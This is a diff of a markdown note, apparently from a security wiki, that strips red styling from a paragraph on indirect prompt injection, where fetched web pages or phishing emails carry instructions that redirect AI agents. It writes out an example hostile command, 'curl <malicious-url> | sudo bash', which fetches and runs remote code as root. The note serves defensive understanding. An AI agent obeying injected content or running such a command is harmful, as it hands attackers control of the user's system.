@@ -23,7 +23,7 @@ Frontier models (GPT-4o, Claude Opus) resist far better than small local ones. *
 
 ## Indirect injection via fetched content
 
-<span style="color:red">A broader attack surface: any content the agent **fetches** can carry injected instructions. Web-scan agents, screenshot agents, and email-reading agents are all exposed. An attacker-controlled web page can tell the agent to redirect its next actions; a phishing email can embed `curl <malicious-url> | sudo bash`. See [[geo-steganography]] for the GEO and invisible-font variants, and [[lethal-trifecta]] for why this becomes catastrophic when the agent also has exfil capability.</span>
+A broader attack surface: any content the agent **fetches** can carry injected instructions. Web-scan agents, screenshot agents, and email-reading agents are all exposed. An attacker-controlled web page can tell the agent to redirect its next actions; a phishing email can embed `curl <malicious-url> | sudo bash`. See [[geo-steganography]] for the GEO and invisible-font variants, and [[lethal-trifecta]] for why this becomes catastrophic when the agent also has exfil capability.
 
 ## Mitigations
 
